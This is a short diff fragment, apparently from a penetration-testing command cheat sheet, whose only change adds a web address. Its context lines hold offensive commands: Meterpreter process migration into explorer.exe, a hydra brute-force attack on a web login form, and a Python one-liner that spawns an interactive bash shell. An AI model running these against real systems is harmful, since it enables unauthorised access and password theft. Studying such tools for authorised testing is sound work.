@@ -25,3 +25,6 @@ migrate -N explorer.exe
 hydra -l <username> -P <password_list> <target_ip> http-post-form "<url>:<post_data>:<failure_string>"
 
 python -c “import pty; pty.spawn(‘/bin/bash’)”
+
+
+https://www.alexandroslekkas.com/
